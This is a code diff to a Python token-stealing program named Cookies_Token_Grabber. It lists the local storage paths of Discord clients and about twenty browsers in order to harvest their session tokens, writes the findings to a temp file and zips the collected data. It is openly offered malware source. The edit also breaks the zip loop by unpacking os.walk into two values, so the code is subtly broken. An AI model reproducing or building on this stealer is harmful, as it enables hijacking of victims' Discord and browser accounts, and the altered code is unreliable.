@@ -174,28 +174,28 @@ class Cookies_Token_Grabber:
         f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Cookies | https://github.com/CookiesKush420\n\n")
         paths = {
-            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
-            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
-            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
-            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
-            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
-            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
-            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
-            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
-            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
+            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
+            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
+            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
+            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
+            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
+            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
 
         for source, path in paths.items():
@@ -314,7 +314,7 @@ class Cookies_Token_Grabber:
     def zip(self, src, dst):
         zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(src)
-        for dirname, _, files in os.walk(src):
+        for dirname, files in os.walk(src):
             for filename in files:
                 absname = os.path.abspath(os.path.join(dirname, filename))
                 arcname = absname[len(abs_src) + 1:]
